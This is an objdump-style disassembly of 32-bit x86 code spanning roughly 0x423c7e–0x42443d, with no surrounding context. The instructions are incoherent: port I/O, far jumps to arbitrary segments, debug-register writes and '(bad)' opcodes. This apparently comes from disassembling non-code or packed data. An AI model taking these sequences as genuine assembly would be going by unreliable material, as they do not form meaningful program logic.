  423c7e:	in     al,dx
  423c7f:	pop    ss
  423c80:	mov    BYTE PTR [ecx],al
  423c82:	cmp    al,0x64
  423c84:	pop    esp
  423c85:	jnp    0x423c3c
  423c87:	dec    ebp
  423c88:	and    eax,0xdccffd86
  423c8d:	inc    ebx
  423c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c8f:	sub    al,BYTE PTR [esi+0x60e9268d]
  423c95:	or     dl,al
  423c97:	pop    ebx
  423c98:	jno    0x423cd9
  423c9a:	retf   0xaa9e
  423c9d:	call   0x7b58dc6f
  423ca2:	test   al,0x7e
  423ca4:	mov    ch,0x2c
  423ca6:	not    dh
  423ca8:	and    al,0xc8
  423caa:	xor    cl,BYTE PTR [ebx+0x16]
  423cad:	or     al,0xbf
  423caf:	or     DWORD PTR [edi+0x518a193c],0xffffffa1
  423cb6:	test   BYTE PTR [esi-0x80],dh
  423cb9:	int    0x7
  423cbb:	ds mov esp,0xea84b274
  423cc1:	das    
  423cc2:	add    eax,0x3bd164e8
  423cc7:	mov    eax,0x8ad3cc0a
  423ccc:	add    bl,BYTE PTR [ebp-0x42]
  423ccf:	out    dx,eax
  423cd0:	outs   dx,BYTE PTR ds:[esi]
  423cd1:	daa    
  423cd2:	icebp  
  423cd3:	jo     0x423d26
  423cd5:	fimul  WORD PTR [esi+0x3b]
  423cd8:	scas   al,BYTE PTR es:[edi]
  423cd9:	dec    ecx
  423cda:	bound  eax,QWORD PTR [esi+0x3f8be869]
  423ce0:	loopne 0x423d0a
  423ce2:	retf   0xbf0d
  423ce5:	pop    ebp
  423ce6:	popf   
  423ce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ce8:	mov    ebp,0x312389de
  423ced:	mov    bl,0xb3
  423cef:	ret    
  423cf0:	push   ebp
  423cf1:	imul   esi,DWORD PTR [edx+0x6a],0xf04b0f62
  423cf8:	pop    ebp
  423cf9:	sub    al,0x7d
  423cfb:	inc    esi
  423cfc:	out    0x65,eax
  423cfe:	jnp    0x423cba
  423d00:	bound  edi,QWORD PTR [ecx-0x47]
  423d03:	jl     0x423c9d
  423d05:	jge    0x423d73
  423d07:	or     BYTE PTR [ebx+edx*1+0x23],dl
  423d0b:	loop   0x423cad
  423d0d:	fmul   QWORD PTR [eax+edi*1-0x55]
  423d11:	dec    esi
  423d12:	mov    al,ds:0x704c6edf
  423d17:	jge    0x423d5d
  423d19:	jge    0x423cbc
  423d1b:	dec    ebx
  423d1c:	push   esp
  423d1d:	cmp    BYTE PTR [edx+0x23840f58],ch
  423d23:	adc    ch,BYTE PTR [ebx-0xf]
  423d26:	out    0x4e,eax
  423d28:	pop    esp
  423d29:	xor    eax,0x919a942f
  423d2e:	mov    DWORD PTR [ebx],esi
  423d30:	mov    dh,BYTE PTR [ebx]
  423d32:	scas   al,BYTE PTR es:[edi]
  423d33:	cmp    al,0xb7
  423d35:	cmp    eax,0xf9903c0b
  423d3a:	mov    bh,0x76
  423d3c:	mov    al,0xc9
  423d3e:	outs   dx,DWORD PTR ds:[esi]
  423d3f:	pop    ss
  423d40:	jnp    0x423d38
  423d42:	or     al,0xf4
  423d44:	call   0x959:0xe21a3645
  423d4b:	fisttp QWORD PTR [eax]
  423d4d:	inc    esi
  423d4e:	pop    esi
  423d4f:	mov    ecx,0x6e962719
  423d54:	(bad)  
  423d55:	mov    eax,ebx
  423d57:	js     0x423d41
  423d59:	and    eax,0xec24b808
  423d5e:	push   cs
  423d5f:	sahf   
  423d60:	(bad)  
  423d61:	aam    0xb
  423d63:	sbb    dh,BYTE PTR [edi]
  423d65:	dec    ebx
  423d66:	xchg   edi,eax
  423d67:	adc    al,0xa4
  423d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d6a:	retf   0x5831
  423d6d:	retf   
  423d6e:	jmp    0x9fb4:0xac20b961
  423d75:	into   
  423d76:	sbb    esp,ecx
  423d78:	mov    al,0x1c
  423d7a:	mov    ch,0xeb
  423d7c:	int3   
  423d7d:	dec    esi
  423d7e:	and    eax,0xcf5299a1
  423d83:	xchg   ecx,eax
  423d84:	add    al,0x4f
  423d86:	jbe    0x423df9
  423d88:	aad    0xc5
  423d8a:	(bad)  
  423d8b:	add    BYTE PTR [ebx-0x79],dl
  423d8e:	or     BYTE PTR [ecx+0x6b66ecf4],ch
  423d94:	enter  0x7343,0xe1
  423d98:	cmp    eax,DWORD PTR [esi]
  423d9a:	inc    eax
  423d9b:	dec    edx
  423d9c:	sbb    al,BYTE PTR [eax]
  423d9e:	jno    0x423e18
  423da0:	rcl    al,0xa8
  423da3:	xlat   BYTE PTR ds:[ebx]
  423da4:	sub    esp,ebp
  423da6:	sbb    ecx,DWORD PTR [eax+0x61]
  423da9:	mov    eax,ds:0xbd33b1a2
  423dae:	push   0xf270f2e
  423db3:	test   DWORD PTR [ecx+0x281b627e],esp
  423db9:	in     eax,0xf9
  423dbb:	mov    ebx,0x56e0b50c
  423dc0:	out    0x39,eax
  423dc2:	sub    DWORD PTR [ecx+edx*4-0x53],ebp
  423dc6:	ret    
  423dc7:	jp     0x423dcc
  423dc9:	mov    dl,BYTE PTR [eax+0x17197434]
  423dcf:	push   edi
  423dd0:	mov    bl,0xb4
  423dd2:	and    DWORD PTR [ecx+0x7b],esp
  423dd5:	jne    0x423d87
  423dd7:	push   ebx
  423dd8:	enter  0x476d,0xfd
  423ddc:	xchg   BYTE PTR [eax+ecx*2],bh
  423ddf:	xchg   BYTE PTR [edx-0x2a9b9b54],bl
  423de5:	pop    ds
  423de6:	jmp    0x9d15:0x3834f0e
  423ded:	jmp    0x4509:0xd8440922
  423df4:	jbe    0x423db6
  423df6:	test   BYTE PTR [ebp+0x78686f68],dl
  423dfc:	retf   
  423dfd:	call   0x16b995ae
  423e02:	pop    esi
  423e03:	adc    DWORD PTR [edi+0x16],0xffffff80
  423e07:	fwait
  423e08:	push   ecx
  423e09:	inc    esi
  423e0a:	xlat   BYTE PTR ds:[ebx]
  423e0b:	pop    esp
  423e0c:	test   al,0x7
  423e0e:	sbb    DWORD PTR [edi],ebx
  423e10:	cmp    BYTE PTR [ecx+0x2939121],bl
  423e16:	fild   DWORD PTR [ecx]
  423e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e19:	mov    esp,0xfdb3ff96
  423e1e:	in     al,0x92
  423e20:	aad    0x37
  423e22:	xchg   ebx,eax
  423e23:	mov    WORD PTR [edi+0x38f8ae7e],cs
  423e29:	imul   bl
  423e2b:	ss jecxz 0x423e8e
  423e2e:	stos   DWORD PTR es:[edi],eax
  423e2f:	dec    esi
  423e30:	push   edx
  423e31:	(bad)  
  423e32:	aam    0x47
  423e34:	cdq    
  423e35:	cmc    
  423e36:	test   DWORD PTR [esi],ebx
  423e38:	xchg   dh,bl
  423e3a:	xor    eax,0x74846ed0
  423e3f:	out    dx,eax
  423e40:	fdivr  DWORD PTR [edx]
  423e42:	or     ecx,DWORD PTR cs:[esi]
  423e45:	call   0xd0d8:0xec7a380c
  423e4c:	push   ebp
  423e4d:	add    al,0x5a
  423e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e50:	stos   DWORD PTR es:[edi],eax
  423e51:	sbb    ecx,DWORD PTR [esi-0x48]
  423e54:	fst    QWORD PTR [edx+0x4e]
  423e57:	xor    eax,0xc3958ac0
  423e5c:	fsubr  QWORD PTR ds:0xd778e2d3
  423e62:	mov    al,0xd5
  423e64:	xchg   DWORD PTR [esi+esi*4+0x3a0481af],ecx
  423e6b:	shr    ah,cl
  423e6d:	push   ebx
  423e6e:	nop
  423e6f:	fsubr  QWORD PTR [edi-0x62]
  423e72:	aam    0xb5
  423e74:	xor    ebx,DWORD PTR [ecx]
  423e76:	imul   eax,DWORD PTR [edx],0x72
  423e79:	pop    edx
  423e7a:	jmp    0x423e71
  423e7c:	sahf   
  423e7d:	mov    esp,0x17491f14
  423e82:	int3   
  423e83:	push   ds
  423e84:	ss pop ds
  423e86:	nop
  423e87:	dec    eax
  423e88:	setge  dl
  423e8b:	mov    al,0x87
  423e8d:	push   esi
  423e8e:	std    
  423e8f:	push   ebp
  423e90:	pop    ebx
  423e91:	xlat   BYTE PTR ds:[ebx]
  423e92:	int3   
  423e93:	ficomp DWORD PTR [eax+0x181d7c26]
  423e99:	fwait
  423e9a:	icebp  
  423e9b:	mov    al,BYTE PTR [ebp+0x333b8a4d]
  423ea1:	sbb    dh,BYTE PTR [ebp+0x18]
  423ea4:	fsubr  DWORD PTR [edi]
  423ea6:	add    DWORD PTR [edi-0x63],edx
  423ea9:	or     al,0xdc
  423eab:	pop    ds
  423eac:	mov    eax,0x1fdd3f04
  423eb1:	dec    ebp
  423eb2:	repz int3 
  423eb4:	cmp    dh,bh
  423eb6:	ret    0x860d
  423eb9:	mov    WORD PTR [edi-0x875ff0],es
  423ebf:	pusha  
  423ec0:	add    DWORD PTR [eax],edx
  423ec2:	scas   al,BYTE PTR es:[edi]
  423ec3:	cli    
  423ec4:	xchg   ebx,eax
  423ec5:	xchg   ebx,esp
  423ec7:	push   edi
  423ec8:	cld    
  423ec9:	in     al,0x4f
  423ecb:	fdivp  st(0),st
  423ecd:	icebp  
  423ece:	in     eax,0x1e
  423ed0:	or     eax,0x3e1c17ae
  423ed5:	or     edx,0x397a9821
  423edb:	jecxz  0x423e70
  423edd:	xchg   ecx,eax
  423ede:	fmul   DWORD PTR [edi-0x2b91327]
  423ee4:	pop    eax
  423ee5:	pop    esp
  423ee6:	cdq    
  423ee7:	lods   al,BYTE PTR ds:[esi]
  423ee8:	out    0xb7,al
  423eea:	add    al,BYTE PTR [esi-0x3ad472d4]
  423ef0:	jns    0x423f48
  423ef2:	cli    
  423ef3:	sbb    DWORD PTR [esi+0x6c8c7001],edi
  423ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423efa:	and    eax,ebp
  423efc:	jmp    0x402:0x88065139
  423f03:	xor    eax,0x96dfa0d4
  423f08:	mov    ah,0x19
  423f0a:	sbb    eax,0xad9b21a2
  423f0f:	std    
  423f10:	cmp    eax,0xf1c8205e
  423f15:	or     BYTE PTR [eax],ch
  423f17:	imul   esp,DWORD PTR [ecx+0x7b],0x22
  423f1b:	adc    esi,DWORD PTR [ebx]
  423f1d:	pop    ebx
  423f1e:	fcom   QWORD PTR [ebp-0x1af507e4]
  423f24:	mov    eax,0x959d6c17
  423f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f2a:	outs   dx,BYTE PTR ds:[esi]
  423f2b:	jb     0x423f7d
  423f2d:	and    BYTE PTR ss:[ecx],0xe3
  423f31:	add    ah,BYTE PTR [eax]
  423f33:	adc    esp,0xfffffff8
  423f36:	je     0x423ed7
  423f38:	shr    BYTE PTR ds:0xd4a4b7de,cl
  423f3e:	cs mov ch,0x80
  423f41:	dec    eax
  423f42:	cld    
  423f43:	pop    ss
  423f44:	outs   dx,DWORD PTR ds:[esi]
  423f45:	shl    ch,1
  423f47:	js     0x423f45
  423f49:	jnp    0x423f89
  423f4b:	xor    dl,BYTE PTR [edx]
  423f4d:	out    0x3,al
  423f4f:	dec    eax
  423f50:	lea    edx,[esi]
  423f52:	and    DWORD PTR [ebx+edi*2+0x9],ecx
  423f56:	aas    
  423f57:	pop    ss
  423f58:	pop    ebx
  423f59:	jae    0x423f80
  423f5b:	js     0x423f09
  423f5d:	lods   al,BYTE PTR ds:[esi]
  423f5e:	sub    bl,BYTE PTR [eax+esi*2-0x3729d569]
  423f65:	jg     0x423f83
  423f67:	mov    eax,DWORD PTR [ebp-0x4ea953d9]
  423f6d:	mov    edx,0x83c3cdae
  423f72:	xor    eax,0x3d278b7e
  423f77:	lods   eax,DWORD PTR ds:[esi]
  423f78:	iret   
  423f79:	into   
  423f7a:	(bad)  
  423f7b:	popf   
  423f7c:	loopne 0x423f54
  423f7e:	add    ebx,DWORD PTR [eax-0x68c7b9b7]
  423f84:	sub    ch,0x2
  423f87:	add    ch,al
  423f89:	xchg   BYTE PTR [ebp+0x461cf807],bh
  423f8f:	inc    edi
  423f90:	add    esp,DWORD PTR [eax]
  423f92:	lahf   
  423f93:	ds ins BYTE PTR es:[edi],dx
  423f95:	mov    edi,0xc60cb82b
  423f9a:	pop    eax
  423f9b:	mov    dl,BYTE PTR [eax+0x5d0b41ee]
  423fa1:	cmp    bl,ah
  423fa3:	and    ah,BYTE PTR ds:0x76bb7a78
  423fa9:	adc    bh,BYTE PTR [edi+eax*8+0x9]
  423fad:	pop    ebx
  423fae:	pop    ss
  423faf:	idiv   DWORD PTR [ebp-0x5a7652fa]
  423fb5:	lds    edi,FWORD PTR [ebp+edi*4-0x30]
  423fb9:	fmul   st(5),st
  423fbb:	sub    al,0xa5
  423fbd:	inc    ecx
  423fbe:	jbe    0x423fa6
  423fc0:	retf   0x4584
  423fc3:	outs   dx,DWORD PTR ds:[esi]
  423fc4:	push   ds
  423fc5:	or     BYTE PTR [ebp-0x16ce1c71],0xb6
  423fcc:	sbb    eax,eax
  423fce:	xchg   edi,eax
  423fcf:	mov    ah,0x39
  423fd1:	cmp    eax,0x8bb6fe55
  423fd6:	sub    dl,BYTE PTR [eax+ecx*2+0x75]
  423fda:	out    dx,al
  423fdb:	xchg   ebx,eax
  423fdc:	clc    
  423fdd:	jnp    0x423f7a
  423fdf:	fdivr  st(3),st
  423fe1:	jnp    0x423f7f
  423fe3:	push   0xffffffe1
  423fe5:	nop
  423fe6:	fmulp  st(2),st
  423fe8:	push   cs
  423fe9:	push   0x15607cc0
  423fee:	push   0x24
  423ff0:	dec    esi
  423ff1:	sar    BYTE PTR [edi+0x2b],cl
  423ff4:	jge    0x423ff0
  423ff6:	jae    0x423f90
  423ff8:	out    dx,al
  423ff9:	sbb    al,0x52
  423ffb:	aaa    
  423ffc:	xchg   esp,eax
  423ffd:	rcl    DWORD PTR [ecx+ebp*8],cl
  424000:	add    eax,0xf9461285
  424005:	mov    ds:0x79901d42,al
  42400a:	bound  ebx,QWORD PTR [esp+ebx*1+0xa4777ef]
  424011:	mov    edi,0x534ac43b
  424016:	(bad)  
  424017:	dec    edi
  424018:	jle    0x424028
  42401a:	lds    edx,FWORD PTR [eax-0x44]
  42401d:	ficom  DWORD PTR [esi-0x15]
  424020:	mov    eax,0x57535e9c
  424025:	cmp    eax,0x597d3af
  42402a:	push   ecx
  42402b:	inc    esp
  42402c:	ss out dx,eax
  42402e:	retf   0x7710
  424031:	pusha  
  424032:	in     al,dx
  424033:	into   
  424034:	push   es
  424035:	ins    BYTE PTR es:[edi],dx
  424036:	mov    DWORD PTR [ebx-0x2],0xf5f93ec1
  42403d:	(bad)  
  42403e:	sbb    ah,al
  424040:	mov    eax,0x6921a142
  424045:	adc    al,0x3e
  424047:	mov    ecx,0x6e10afa2
  42404c:	mov    al,0xed
  42404e:	ds dec edi
  424050:	sahf   
  424051:	std    
  424052:	rcl    BYTE PTR [edx],1
  424054:	leave  
  424055:	push   edi
  424056:	call   FWORD PTR [ebp+0x5f]
  424059:	add    al,0xd0
  42405c:	inc    ebp
  42405d:	test   al,0x28
  42405f:	stos   DWORD PTR es:[edi],eax
  424060:	jae    0x42403e
  424062:	test   bh,0x7b
  424065:	or     esi,eax
  424067:	shl    bl,0x49
  42406a:	dec    ebx
  42406b:	imul   eax,DWORD PTR [esp+eax*1+0x78],0xd079cb04
  424073:	ret    0x9d14
  424076:	jl     0x4240e3
  424078:	int    0xf6
  42407a:	add    edx,DWORD PTR [esi]
  42407c:	add    DWORD PTR [edi+0x2c],ebp
  42407f:	adc    al,0x42
  424081:	jno    0x4240ca
  424083:	or     al,0xc9
  424085:	jo     0x424065
  424087:	push   esi
  424088:	std    
  424089:	mov    esi,0xdca7fce8
  42408e:	mov    al,ds:0xf614a692
  424093:	leave  
  424094:	fs pop ebx
  424096:	add    eax,0x38d63a52
  42409b:	cs dec eax
  42409d:	xchg   DWORD PTR [eax+eax*8-0x66],eax
  4240a1:	jl     0x4240a7
  4240a3:	or     eax,0x3b6df7a9
  4240a8:	inc    esp
  4240a9:	dec    ebp
  4240aa:	inc    edi
  4240ab:	mov    cl,0xb5
  4240ad:	dec    edi
  4240ae:	ret    
  4240af:	pop    edx
  4240b0:	ss mov edx,0xd3248f7a
  4240b6:	not    BYTE PTR [edx-0x4708e008]
  4240bc:	shl    DWORD PTR [eax+0x72133f58],1
  4240c2:	jp     0x4240c7
  4240c4:	xchg   edx,eax
  4240c5:	pop    edi
  4240c6:	les    edi,FWORD PTR [edi]
  4240c8:	push   esp
  4240c9:	and    BYTE PTR [edx+0x2a6613b8],bh
  4240cf:	mov    ebx,0x9cf350bc
  4240d4:	sahf   
  4240d5:	ins    BYTE PTR es:[edi],dx
  4240d6:	add    edi,DWORD PTR [ecx+0x6]
  4240d9:	js     0x4240de
  4240db:	imul   eax,esp,0xffffffa0
  4240de:	fiadd  DWORD PTR [esi-0x7f54c686]
  4240e4:	cli    
  4240e5:	mov    al,0x41
  4240e7:	jmp    0x4240a8
  4240e9:	cmp    BYTE PTR [edi+0x5],ah
  4240ec:	js     0x4240e5
  4240ee:	adc    BYTE PTR [edx+ecx*2+0x68],dl
  4240f2:	adc    eax,0x4ab9b997
  4240f7:	test   eax,0x76f67be1
  4240fc:	lds    ebx,FWORD PTR [edx-0x3d]
  4240ff:	xchg   edi,eax
  424100:	xchg   edx,eax
  424101:	pop    edi
  424102:	js     0x4240a7
  424104:	int    0x8a
  424106:	stc    
  424107:	mov    eax,ds:0x9d159537
  42410c:	cwde   
  42410d:	loop   0x4240f6
  42410f:	(bad)  
  424110:	loop   0x424129
  424112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424113:	cmp    al,bl
  424115:	cmp    eax,0x1d0e912c
  42411a:	or     al,0x97
  42411c:	pmaxsw mm3,QWORD PTR [esi-0x6f72ffe5]
  424123:	rol    BYTE PTR ds:0x8643d429,1
  42412a:	push   ebp
  42412b:	mov    esi,0x9b67d5ec
  424130:	mov    dh,0x6b
  424132:	rol    BYTE PTR [esi-0x35],1
  424135:	cs xchg ebp,eax
  424137:	pop    edi
  424138:	das    
  424139:	push   edx
  42413a:	pop    esp
  42413b:	mov    WORD PTR [eax-0x5f],ds
  42413e:	call   FWORD PTR ds:0xd68c5950
  424144:	retf   
  424145:	and    eax,0x3809a303
  42414a:	xor    dh,ah
  42414c:	pop    ebp
  42414d:	aaa    
  42414e:	popf   
  42414f:	imul   ebp,DWORD PTR [edi-0x70f671ad],0x66b192b3
  424159:	mov    BYTE PTR [ecx-0x3d],ch
  42415c:	add    al,0xba
  42415e:	mov    db6,esi
  424161:	in     al,0x59
  424163:	iret   
  424164:	rol    DWORD PTR [esi+0x5d],1
  424167:	inc    esp
  424168:	mov    esi,0xcff9e784
  42416d:	pop    ecx
  42416e:	cld    
  42416f:	out    0xc4,al
  424171:	retf   0x9c3d
  424174:	int    0x16
  424176:	int    0x48
  424178:	jmp    0x424110
  42417a:	inc    ah
  42417c:	mov    dh,0xe2
  42417e:	mov    al,0x81
  424180:	cli    
  424181:	nop
  424182:	cmp    DWORD PTR [esi+0x5e],edx
  424185:	loop   0x4241ea
  424187:	call   0x726af743
  42418c:	js     0x424115
  42418e:	icebp  
  42418f:	ret    0x8a08
  424192:	push   cs
  424193:	mov    ah,0x1d
  424195:	sub    eax,0x73ec8b4e
  42419a:	push   0x5566e641
  42419f:	and    DWORD PTR [ebp-0x3c],edx
  4241a2:	adc    bh,BYTE PTR [eax-0x49851021]
  4241a8:	sar    BYTE PTR [edx],1
  4241aa:	test   DWORD PTR [ebx+0x446c5e3c],ebp
  4241b0:	std    
  4241b1:	repnz xor esi,DWORD PTR [edi-0x628a691b]
  4241b8:	daa    
  4241b9:	(bad)  
  4241ba:	int3   
  4241bb:	and    ebx,DWORD PTR [eax-0x4e]
  4241be:	dec    eax
  4241bf:	adc    DWORD PTR [edx+edi*8],edi
  4241c2:	mov    al,0xc5
  4241c4:	scas   al,BYTE PTR es:[edi]
  4241c5:	pop    es
  4241c6:	out    dx,al
  4241c7:	push   es
  4241c8:	cli    
  4241c9:	or     BYTE PTR [eax+0x58],bl
  4241cc:	cmc    
  4241cd:	clc    
  4241ce:	inc    ecx
  4241cf:	inc    esi
  4241d0:	stos   DWORD PTR es:[edi],eax
  4241d1:	ss lahf 
  4241d3:	mov    ebp,gs
  4241d5:	outs   dx,BYTE PTR ds:[esi]
  4241d6:	out    0x5e,eax
  4241d8:	jle    0x4241b1
  4241da:	cmp    ecx,DWORD PTR [eax+0x21]
  4241dd:	xchg   ebp,esi
  4241df:	lods   eax,DWORD PTR ds:[esi]
  4241e0:	ret    0x6a37
  4241e3:	mov    dh,0x9
  4241e5:	xchg   esi,eax
  4241e6:	and    al,0xae
  4241e8:	int3   
  4241e9:	xor    eax,0x47e123b0
  4241ee:	jnp    0x4241d0
  4241f0:	(bad)  fs:[eax]
  4241f3:	cs retf 
  4241f5:	fnstsw WORD PTR [edx+0x71a28535]
  4241fb:	scas   eax,DWORD PTR es:[edi]
  4241fc:	ror    BYTE PTR [esi-0x1b],1
  4241ff:	in     al,0xba
  424201:	gs aad 0x50
  424204:	dec    esp
  424205:	adc    eax,0xca1582ae
  42420a:	out    0xf5,al
  42420c:	and    DWORD PTR fs:[esi-0x77],ebx
  424210:	lods   al,BYTE PTR ds:[esi]
  424211:	jge    0x424214
  424213:	xchg   ebx,eax
  424214:	cld    
  424215:	jp     0x42427e
  424217:	es in  eax,dx
  424219:	dec    ebp
  42421a:	xor    bl,BYTE PTR [ecx]
  42421c:	ficomp DWORD PTR [eax]
  42421e:	jo     0x424277
  424220:	and    BYTE PTR [ebx],cl
  424222:	push   edi
  424223:	call   0x47e2:0xdad7bea2
  42422a:	fidivr WORD PTR [edi-0x1dcc9936]
  424230:	sbb    BYTE PTR [ecx+0x26],dl
  424233:	sub    dl,BYTE PTR [edx+ebx*4+0x23]
  424237:	iret   
  424238:	jnp    0x42420b
  42423a:	lds    ebp,FWORD PTR [edx+0x55]
  42423d:	mov    ds:0xaed67ad1,eax
  424242:	mov    cl,0xe5
  424244:	cmp    eax,0x12a89576
  424249:	sub    DWORD PTR [edi-0x293d5b96],0x4454b230
  424253:	scas   al,BYTE PTR es:[edi]
  424254:	xchg   edx,eax
  424255:	jecxz  0x42429c
  424257:	mov    edx,DWORD PTR [esp+edi*4+0x5d90129c]
  42425e:	ret    0x999b
  424261:	dec    esp
  424262:	sbb    edx,DWORD PTR [edx-0x4f]
  424265:	pop    ecx
  424266:	inc    edi
  424267:	icebp  
  424268:	xchg   ebx,eax
  424269:	mov    ebx,0xe7d751cb
  42426e:	xor    eax,0x98fb5d21
  424273:	ror    DWORD PTR [eax-0x21],1
  424276:	fwait
  424277:	fs inc esi
  424279:	faddp  st(0),st
  42427b:	ror    DWORD PTR [ebp+0x986bbe6],cl
  424281:	xchg   ecx,eax
  424282:	mov    al,ds:0x7d64c3c0
  424287:	ret    
  424288:	sub    al,0x7f
  42428a:	(bad)  [eax+edi*1-0x37]
  42428e:	push   es
  42428f:	xchg   esi,eax
  424290:	fdiv   DWORD PTR [edx-0x4e]
  424293:	push   edi
  424294:	ds push cs
  424296:	(bad)  
  424297:	fisubr DWORD PTR [ecx-0x61]
  42429a:	xchg   BYTE PTR [ecx-0x2c],cl
  42429d:	lea    edx,[ebp+0x48]
  4242a0:	or     esi,DWORD PTR [edx+0x63]
  4242a3:	data16 sahf 
  4242a5:	aas    
  4242a6:	test   eax,0x2a00334
  4242ab:	cmp    edi,DWORD PTR [esp+ebx*1+0x31cffff2]
  4242b2:	sbb    ebp,ebp
  4242b4:	repz mov esi,DWORD PTR [eax+0x6c0378b2]
  4242bb:	out    dx,al
  4242bc:	mov    al,ds:0x798eb073
  4242c1:	popf   
  4242c2:	push   esp
  4242c3:	add    BYTE PTR [ebx],dl
  4242c5:	mov    BYTE PTR [edx-0x6dd7da13],cl
  4242cb:	aaa    
  4242cc:	mov    eax,0x8a1c212
  4242d1:	hlt    
  4242d2:	dec    ah
  4242d4:	mov    ch,0xf0
  4242d6:	aad    0x5e
  4242d8:	add    BYTE PTR [eax+0x52],bh
  4242db:	sub    bh,BYTE PTR [ecx-0x61]
  4242de:	adc    edi,0xa781be17
  4242e4:	sti    
  4242e5:	rol    DWORD PTR [ebx],cl
  4242e7:	ss loope 0x42432e
  4242ea:	(bad)  
  4242eb:	std    
  4242ec:	je     0x4242cc
  4242ee:	jl     0x424289
  4242f0:	fwait
  4242f1:	adc    al,0x16
  4242f3:	mov    DWORD PTR [eax],esi
  4242f5:	mov    eax,0xf8549a7f
  4242fa:	or     DWORD PTR [ecx],ebp
  4242fc:	mov    ch,0x38
  4242fe:	jnp    0x42430b
  424300:	sub    DWORD PTR [edx],esp
  424302:	add    ebp,DWORD PTR [eax]
  424304:	push   ebp
  424305:	ret    0x6257
  424308:	inc    ebp
  424309:	loopne 0x424389
  42430b:	push   0xcfa15915
  424310:	cld    
  424311:	cli    
  424312:	xlat   BYTE PTR ds:[ebx]
  424313:	xchg   BYTE PTR [ebx-0x5e],ah
  424316:	(bad)  
  424317:	shl    BYTE PTR [edx+ebp*1-0x68],cl
  42431b:	adc    eax,0x2794f13e
  424320:	ret    0x61ec
  424323:	ins    BYTE PTR es:[edi],dx
  424324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424326:	push   0xffffffda
  424328:	mov    bl,0x2d
  42432a:	pop    ebp
  42432b:	je     0x424345
  42432d:	mov    al,0xb7
  42432f:	mov    bl,0x95
  424331:	jbe    0x424395
  424333:	and    ebp,DWORD PTR [edx-0x4bc0be25]
  424339:	std    
  42433a:	cld    
  42433b:	leave  
  42433c:	and    al,0xce
  42433e:	retf   
  42433f:	clc    
  424340:	mov    edx,0x3736abf8
  424345:	pop    edx
  424346:	mov    ebx,0x981ce151
  42434b:	lock jle 0x4243cc
  42434e:	ret    
  42434f:	and    al,0x65
  424351:	sub    DWORD PTR [esp+edx*8],edx
  424354:	xchg   DWORD PTR [ecx],esp
  424356:	hlt    
  424357:	loope  0x424381
  424359:	dec    ebp
  42435a:	pop    eax
  42435b:	aaa    
  42435c:	add    ebp,DWORD PTR [edx+0x42bdb37d]
  424362:	jmp    0xe210:0x5d8eb426
  424369:	inc    ecx
  42436a:	sbb    esi,DWORD PTR [esp+eiz*2+0x29]
  42436e:	das    
  42436f:	or     DWORD PTR [edx-0x35],0x49
  424373:	pop    edx
  424374:	ja     0x4243c0
  424376:	in     eax,0x1e
  424378:	mov    ds:0x87a6f451,eax
  42437d:	adc    al,0xef
  42437f:	sbb    eax,0xcec9aa11
  424384:	dec    esp
  424385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424386:	xchg   edx,eax
  424387:	push   esp
  424388:	call   0x2ae2:0xf03b89a0
  42438f:	sbb    al,0x9e
  424391:	xor    BYTE PTR [esi+0x7a],dh
  424394:	cmp    BYTE PTR [ebx-0x47],al
  424397:	and    DWORD PTR [edi],ebx
  424399:	push   esp
  42439a:	mov    dl,0x90
  42439c:	jns    0x4243a8
  42439e:	cwde   
  42439f:	add    al,0x6c
  4243a1:	outs   dx,DWORD PTR ds:[esi]
  4243a2:	pop    edx
  4243a3:	dec    edx
  4243a4:	jge    0x424358
  4243a6:	addr16 push eax
  4243a8:	stos   DWORD PTR es:[edi],eax
  4243a9:	or     eax,0x80e0c9de
  4243ae:	inc    ebp
  4243af:	aam    0xa1
  4243b1:	rcl    BYTE PTR [ecx+0x70],1
  4243b4:	add    BYTE PTR [ebx+0x20f095d4],bh
  4243ba:	js     0x4243da
  4243bc:	inc    esi
  4243bd:	lds    esp,FWORD PTR [edx-0x17006ae5]
  4243c3:	data16 xor dh,BYTE PTR [ecx]
  4243c6:	cs or  eax,0xab337e49
  4243cc:	push   eax
  4243cd:	fadd   st,st(2)
  4243cf:	and    bl,BYTE PTR [esi+0x69]
  4243d2:	xor    eax,0x1f54fd61
  4243d7:	add    BYTE PTR [eax+0x112c15c7],ah
  4243dd:	dec    ebp
  4243de:	inc    ebx
  4243df:	xlat   BYTE PTR fs:[ebx]
  4243e1:	adc    al,dl
  4243e3:	stos   DWORD PTR es:[edi],eax
  4243e4:	or     al,0xec
  4243e6:	jno    0x42439f
  4243e8:	or     eax,0x9b2eb512
  4243ed:	imul   ebx,DWORD PTR [ebx+0x68],0xda8badc3
  4243f4:	mov    ecx,0xa7d46544
  4243f9:	int    0xb9
  4243fb:	ret    
  4243fc:	lock (bad) 
  4243fe:	out    dx,al
  4243ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424400:	or     al,0x94
  424402:	stos   BYTE PTR es:[edi],al
  424403:	xchg   ecx,eax
  424404:	pop    esi
  424405:	test   BYTE PTR [esi],al
  424407:	fld    DWORD PTR [eax+0x4be21515]
  42440d:	or     ebx,esi
  42440f:	mov    esp,0x2184aaba
  424414:	inc    esi
  424415:	das    
  424416:	xchg   ebp,eax
  424417:	jge    0x42442b
  424419:	push   eax
  42441a:	xchg   BYTE PTR [esi-0x63],ch
  42441d:	or     bh,bh
  42441f:	lds    ecx,FWORD PTR [esi]
  424421:	mov    ebx,0x77f84f03
  424426:	rol    edi,1
  424428:	adc    al,0x61
  42442a:	jbe    0x424488
  42442c:	dec    esp
  42442d:	jnp    0x424428
  42442f:	lds    eax,FWORD PTR [ecx+eiz*8]
  424432:	stos   BYTE PTR es:[edi],al
  424433:	sbb    DWORD PTR [ecx],ebp
  424435:	int3   
  424436:	stc    
  424437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424438:	jecxz  0x4243ba
  42443a:	dec    esp
  42443b:	jge    0x4244bc
  42443d:	dec    edi
